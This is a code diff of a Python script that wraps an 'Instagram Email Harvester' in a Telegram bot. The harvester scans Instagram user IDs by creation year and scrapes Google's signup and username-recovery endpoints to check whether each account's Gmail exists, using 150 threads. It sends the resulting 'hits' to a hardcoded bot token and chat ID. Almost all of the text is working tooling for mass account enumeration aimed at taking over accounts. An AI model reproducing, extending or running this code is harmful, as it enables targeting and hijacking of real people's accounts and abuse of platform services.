@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-🤖 Telegram Bot - Instagram Email Account Harvester 
-    Hardcoded Bot Token & Chat ID - Render Ready
-    
-    Original logic preserved 100% - Only added TG bot interface
+🤖 Telegram Bot - Instagram Email Harvester
+    Pure requests-based polling (no python-telegram-bot)
+    ✅ Pydroid3 / Android / Render compatible
+    ✅ No asyncio issues
+    ✅ Original logic preserved 100%
 """
 
 import os
@@ -15,7 +16,6 @@ import string
 import time
 import threading
 import logging
-import asyncio
 import base64
 import ssl
 from datetime import datetime, timedelta
@@ -34,27 +34,80 @@ from random import choice as cc
 from random import randrange as rr
 from rich.console import Console
 
-# Telegram Bot imports
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
-
 # ─────────── HARDCODED TELEGRAM CREDENTIALS ───────────
 BOT_TOKEN = "8760415886:AAH-JhrbqKGtfyc_-zJ4ewGedle2Q-vvJj0"
 CHAT_ID = "8598993143"
-# ⚠️ CHANGE BOT TOKEN & CHAT ID ABOVE IF NEEDED ⚠️
 
 # ─────────── GLOBALS ───────────
 checker_running = False
 checker_thread = None
 checker_instance = None
-bot_app = None
+last_update_id = 0
 
-# ─────────── LOGGING ───────────
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# ─────────── PURE REQUESTS TELEGRAM API ───────────
+
+def tg_send(chat_id, text, parse_mode='Markdown'):
+    """Send a message via Telegram Bot API using raw requests"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def tg_send_inline_buttons(chat_id, text, buttons):
+    """Send a message with inline keyboard buttons"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": "Markdown",
+            "reply_markup": {"inline_keyboard": buttons}
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def tg_edit(chat_id, message_id, text, parse_mode='Markdown'):
+    """Edit an existing message"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        payload = {
+            "chat_id": chat_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": parse_mode
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def tg_answer_callback(callback_id, text=None):
+    """Answer a callback query"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+        payload = {"callback_query_id": callback_id}
+        if text:
+            payload["text"] = text
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def tg_get_updates(offset=None):
+    """Get pending updates from Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+        params = {"timeout": 30}
+        if offset:
+            params["offset"] = offset
+        resp = requests.get(url, params=params, timeout=35)
+        data = resp.json()
+        if data.get("ok"):
+            return data.get("result", [])
+    except:
+        pass
+    return []
 
 # ═══════════════════════════════════════════════════════════
 #  ORIGINAL CHECKER CLASS - PRESERVED 100%
@@ -69,12 +122,11 @@ class InstagramEmailChecker:
         self.ID = CHAT_ID
         self.token = BOT_TOKEN
         self.rest = 1
-        self.bot_asked = True  # Skip interactive prompt
+        self.bot_asked = True
 
         self.PREDEFINED_BOT_TOKEN = BOT_TOKEN
         self.PREDEFINED_CHAT_ID = CHAT_ID
 
-        # Colors
         self.Z = '\033[1;31m'
         self.Z1 = '\033[2;31m'
         self.F = '\033[2;32m'
@@ -105,32 +157,31 @@ class InstagramEmailChecker:
             pass
 
     def send_to_bots(self, message):
-        """Send hit details to Telegram via direct API call"""
+        """Send hit details to Telegram"""
         try:
-            # Send to hardcoded bot
             response = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                params={"chat_id": CHAT_ID, "text": message},
+                params={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"},
                 timeout=5
             )
-        except Exception as e:
+        except:
             pass
 
     def send_status_screen(self):
-        """Send live status/stats screen to Telegram after each hit"""
-        status = f'''
-×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×   
-       HITS      : {self.hits} 
-       BAD MAIL  : {self.bads_email}
-       BAD INSTA : {self.bads_instgram}
-       RUNNING   : {'✅ ACTIVE' if checker_running else '❌ STOPPED'}
-×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×    
-ADMIN :- @cruzz 
-×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×'''
+        """Send live status after each hit"""
+        status = (
+            f"📊 *Live Status*\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"• HITS      : `{self.hits}`\n"
+            f"• BAD MAIL  : `{self.bads_email}`\n"
+            f"• BAD INSTA : `{self.bads_instgram}`\n"
+            f"• RUNNING   : `{'✅ ACTIVE' if checker_running else '❌ STOPPED'}`\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"`@cruzz // @pythontoolz`"
+        )
         self.send_to_bots(status)
 
     def get_bot_details(self):
-        """Skipped - using hardcoded credentials"""
         pass
 
     def tll(self):
@@ -165,9 +216,7 @@ ADMIN :- @cruzz
 
             res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
             tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
-            cookies = {
-                '__Host-GAPS': host
-            }
+            cookies = {'__Host-GAPS': host}
             headers = {
                 'authority': 'accounts.google.com',
                 'accept': '*/*',
@@ -210,9 +259,7 @@ ADMIN :- @cruzz
                 self.tll()
                 o = open('tl.txt', 'r').read().splitlines()[0]
             tl, host = o.split('//')
-            cookies = {
-                '__Host-GAPS': host
-            }
+            cookies = {'__Host-GAPS': host}
             headers = {
                 'authority': 'accounts.google.com',
                 'accept': '*/*',
@@ -223,9 +270,7 @@ ADMIN :- @cruzz
                 'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
                 'user-agent': gg(),
             }
-            params = {
-                'TL': tl,
-            }
+            params = {'TL': tl}
             data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
             response = pp(
                 'https://accounts.google.com/_/signup/usernameavailability',
@@ -248,9 +293,7 @@ ADMIN :- @cruzz
     def info(self, username, jj):
         try:
             url = f"https://www.instagram.com/{username}/"
-            headers = {
-                "User-Agent": "Mozilla/5.0"
-            }
+            headers = {"User-Agent": "Mozilla/5.0"}
             response = requests.get(url, headers=headers)
             html = response.text
             match = re.search(r'"profile_id":"(\d+)"', html)
@@ -276,6 +319,7 @@ ADMIN :- @cruzz
             username = user['username']
             uid = user['id']
             try:
+                from asmix import Instagram
                 date = Instagram.date(uid)
             except:
                 date = 'None'
@@ -309,7 +353,7 @@ ADMIN :- @cruzz
             if posts >= 1:
                 self.hits += 1
                 self.send_to_bots(chut)
-                self.send_status_screen()  # Live TG update after each hit
+                self.send_status_screen()
                 with open('hits.txt', "a", encoding="utf-8") as f:
                     f.write(chut + "\n")
         except Exception as e:
@@ -324,7 +368,7 @@ BY : @cruzz // @pythontoolz
 """
             self.hits += 1
             self.send_to_bots(chut)
-            self.send_status_screen()  # Live TG update after each hit
+            self.send_status_screen()
             with open('cruzzhits.txt', "a", encoding="utf-8") as f:
                 f.write(chut + "\n")
 
@@ -344,7 +388,6 @@ BY : @cruzz // @pythontoolz
             return
         try:
             pp_choice = choice('00')
-
             if pp_choice == '0':
                 with httpx.Client(http2=True) as client:
                     r = client.post(
@@ -432,7 +475,7 @@ ADMIN :- @cruzz
         else:
             return
 
-        self.send_to_bots(f"🚀 Checker STARTED for year option {num}")
+        tg_send(CHAT_ID, f"🚀 *Checker STARTED* for year option {num}\n\n`@cruzz // @pythontoolz`")
 
         threads = []
         for _ in range(150):
@@ -443,179 +486,137 @@ ADMIN :- @cruzz
         for thread in threads:
             thread.join()
 
+        global checker_running
         checker_running = False
-        self.send_to_bots(f"✅ Checker FINISHED — Total Hits: {self.hits}")
+        tg_send(CHAT_ID, f"✅ *Checker FINISHED* — Total Hits: `{self.hits}`\n\n`@cruzz // @pythontoolz`")
 
 
 # ═══════════════════════════════════════════════════════════
-#  TELEGRAM BOT HANDLERS
+#  TELEGRAM BOT POLLING LOOP (pure requests, no asyncio)
 # ═══════════════════════════════════════════════════════════
 
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = (
-        "🤖 *Instagram Email Harvester Bot*\n\n"
-        "Select a year range via /run and the bot will:\n"
-        "• Scan Instagram user IDs from that era\n"
-        "• Check if the Gmail exists via Google's signup API\n"
-        "• Verify the account on Instagram\n"
-        "• Send hits + live stats to this chat\n\n"
-        "📋 *Commands:*\n"
-        "• /run — Start checker (year selection)\n"
-        "• /stop — Stop the checker\n"
-        "• /status — Show current stats\n"
-        "• /start — Show this menu\n\n"
-        "`Powered by @cruzz // @pythontoolz`"
-    )
-    await update.message.reply_text(msg, parse_mode='Markdown')
+def handle_update(update):
+    """Process a single Telegram update"""
+    global checker_running, checker_thread, checker_instance, last_update_id
+
+    # Handle callback queries (button presses)
+    if "callback_query" in update:
+        cq = update["callback_query"]
+        cq_id = cq["id"]
+        chat_id = cq["message"]["chat"]["id"]
+        msg_id = cq["message"]["message_id"]
+        data = cq["data"]
+
+        tg_answer_callback(cq_id)
+
+        if data.startswith("year_"):
+            year = int(data.split("_")[1])
+            year_map = {1: "2011", 2: "2012", 3: "2013", 4: "2014", 5: "2015", 6: "2016-2017"}
+            year_label = year_map.get(year, str(year))
+
+            tg_edit(chat_id, msg_id, f"🚀 *Starting checker for {year_label}...*\n\nHits & live stats will appear here automatically.\nUse /status anytime.")
+
+            checker_instance = InstagramEmailChecker()
+            checker_thread = threading.Thread(target=checker_instance.run, args=(year,), daemon=True)
+            checker_running = True
+            checker_thread.start()
+
+    # Handle text commands
+    elif "message" in update:
+        msg = update["message"]
+        chat_id = msg["chat"]["id"]
+        text = msg.get("text", "")
+
+        if text == "/start":
+            tg_send(chat_id, (
+                "🤖 *Instagram Email Harvester Bot*\n\n"
+                "Select a year range via /run and the bot will:\n"
+                "• Scan Instagram user IDs from that era\n"
+                "• Check if the Gmail exists via Google's signup API\n"
+                "• Verify the account on Instagram\n"
+                "• Send hits + live stats to this chat\n\n"
+                "📋 *Commands:*\n"
+                "• /run — Start checker (year selection)\n"
+                "• /stop — Stop the checker\n"
+                "• /status — Show current stats\n"
+                "• /start — Show this menu\n\n"
+                "`Powered by @cruzz // @pythontoolz`"
+            ))
+
+        elif text == "/run":
+            if checker_running:
+                tg_send(chat_id, "⚠️ *Checker is already running!*\nUse /stop first.")
+            else:
+                buttons = [
+                    [
+                        {"text": "📅 2011", "callback_data": "year_1"},
+                        {"text": "📅 2012", "callback_data": "year_2"},
+                    ],
+                    [
+                        {"text": "📅 2013", "callback_data": "year_3"},
+                        {"text": "📅 2014", "callback_data": "year_4"},
+                    ],
+                    [
+                        {"text": "📅 2015", "callback_data": "year_5"},
+                        {"text": "📅 2016-2017", "callback_data": "year_6"},
+                    ],
+                ]
+                tg_send_inline_buttons(chat_id, "📆 *Select a year range to scan:*", buttons)
+
+        elif text == "/stop":
+            if checker_running:
+                checker_running = False
+                tg_send(chat_id, "⏹️ *Stop signal sent...* Waiting for threads to finish.")
+            else:
+                tg_send(chat_id, "❌ Checker is *not* currently running.")
+
+        elif text == "/status":
+            if checker_instance:
+                status = (
+                    f"📊 *Live Status*\n\n"
+                    f"• Hits       : `{checker_instance.hits}`\n"
+                    f"• Bad Mail   : `{checker_instance.bads_email}`\n"
+                    f"• Bad Insta  : `{checker_instance.bads_instgram}`\n"
+                    f"• Running    : {'✅ Yes' if checker_running else '❌ No'}\n\n"
+                    f"`@cruzz // @pythontoolz`"
+                )
+                tg_send(chat_id, status)
+            else:
+                tg_send(chat_id, "❌ Checker has not been started yet. Use /run.")
 
 
-async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global checker_running
+def bot_polling_loop():
+    """Main polling loop — runs in main thread, no asyncio needed"""
+    global last_update_id
 
-    if checker_running:
-        await update.message.reply_text("⚠️ *Checker is already running!*\nUse /stop first.", parse_mode='Markdown')
-        return
-
-    keyboard = [
-        [
-            InlineKeyboardButton("📅 2011", callback_data="year_1"),
-            InlineKeyboardButton("📅 2012", callback_data="year_2"),
-        ],
-        [
-            InlineKeyboardButton("📅 2013", callback_data="year_3"),
-            InlineKeyboardButton("📅 2014", callback_data="year_4"),
-        ],
-        [
-            InlineKeyboardButton("📅 2015", callback_data="year_5"),
-            InlineKeyboardButton("📅 2016-2017", callback_data="year_6"),
-        ],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "📆 *Select a year range to scan:*\n\n"
-        "*(Hits are sent here automatically)*",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
-
-
-async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global checker_running
-
-    if checker_running:
-        checker_running = False
-        await update.message.reply_text("⏹️ *Stop signal sent...*\nWaiting for threads to finish.", parse_mode='Markdown')
-    else:
-        await update.message.reply_text("❌ Checker is *not* currently running.", parse_mode='Markdown')
-
-
-async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global checker_instance, checker_running
-
-    if checker_instance:
-        status = (
-            f"📊 *Live Status*\n\n"
-            f"• Hits       : `{checker_instance.hits}`\n"
-            f"• Bad Mail   : `{checker_instance.bads_email}`\n"
-            f"• Bad Insta  : `{checker_instance.bads_instgram}`\n"
-            f"• Running    : {'✅ Yes' if checker_running else '❌ No'}\n\n"
-            f"`@cruzz // @pythontoolz`"
-        )
-        await update.message.reply_text(status, parse_mode='Markdown')
-    else:
-        await update.message.reply_text("❌ Checker has not been started yet. Use /run.")
-
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global checker_running, checker_thread, checker_instance
-
-    query = update.callback_query
-    await query.answer()
-
-    if query.data.startswith("year_"):
-        year = int(query.data.split("_")[1])
-        year_map = {1: "2011", 2: "2012", 3: "2013", 4: "2014", 5: "2015", 6: "2016-2017"}
-        year_label = year_map.get(year, str(year))
-
-        await query.edit_message_text(
-            f"🚀 *Starting checker for {year_label}...*\n\n"
-            "Hits & live stats will appear here automatically.\n"
-            "Use /status to check progress anytime.",
-            parse_mode='Markdown'
-        )
-
-        # Create and start checker in background thread
-        checker_instance = InstagramEmailChecker()
-        checker_thread = threading.Thread(target=checker_instance.run, args=(year,), daemon=True)
-        checker_running = True
-        checker_thread.start()
-
-
-async def post_init(application: Application):
-    """Send startup notification to the hardcoded chat"""
+    # Send startup notification
     try:
-        await application.bot.send_message(
-            chat_id=CHAT_ID,
-            text=(
-                "🤖 *Bot is online!*\n\n"
-                "Ready to run Instagram email harvester.\n"
-                "Use /run to start scanning."
-            ),
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.error(f"Startup message failed: {e}")
+        tg_send(CHAT_ID, "🤖 *Bot is online!*\n\nReady to run Instagram email harvester.\nUse /run to start scanning.")
+    except:
+        pass
 
+    while True:
+        try:
+            updates = tg_get_updates(offset=last_update_id)
+            for update in updates:
+                if "update_id" in update:
+                    last_update_id = update["update_id"] + 1
+                    handle_update(update)
+        except KeyboardInterrupt:
+            print("\n👋 Bot shutting down...")
+            break
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(5)
 
-# ═══════════════════════════════════════════════════════════
-#  TRY CUSTOM MODULE IMPORTS
-# ═══════════════════════════════════════════════════════════
-
-try:
-    from asmix import Instagram
-except ImportError:
-    Instagram = None
-    logger.warning("asmix.Instagram not installed — date lookup will be 'None'")
-
-try:
-    import ethan
-except ImportError:
-    ethan = None
 
 # ═══════════════════════════════════════════════════════════
 #  MAIN ENTRY POINT
 # ═══════════════════════════════════════════════════════════
 
-def main():
-    global bot_app
-
-    print("🤖 Starting Telegram bot polling...")
+if __name__ == "__main__":
+    print("🤖 Starting Telegram bot polling (pure requests)...")
     print(f"   Bot Token : {BOT_TOKEN[:8]}...")
     print(f"   Chat ID   : {CHAT_ID}")
-    print(f"   Listening for commands...")
     print()
-
-    # Build application
-    application = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .post_init(post_init)
-        .build()
-    )
-
-    # Register command handlers
-    application.add_handler(CommandHandler("start", start_cmd))
-    application.add_handler(CommandHandler("run", run_cmd))
-    application.add_handler(CommandHandler("stop", stop_cmd))
-    application.add_handler(CommandHandler("status", status_cmd))
-    application.add_handler(CallbackQueryHandler(button_callback))
-
-    # Store global reference
-    bot_app = application
-
-    # Start polling (blocks forever)
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
-
-
-if __name__ == "__main__":
-    main()
+    bot_polling_loop()
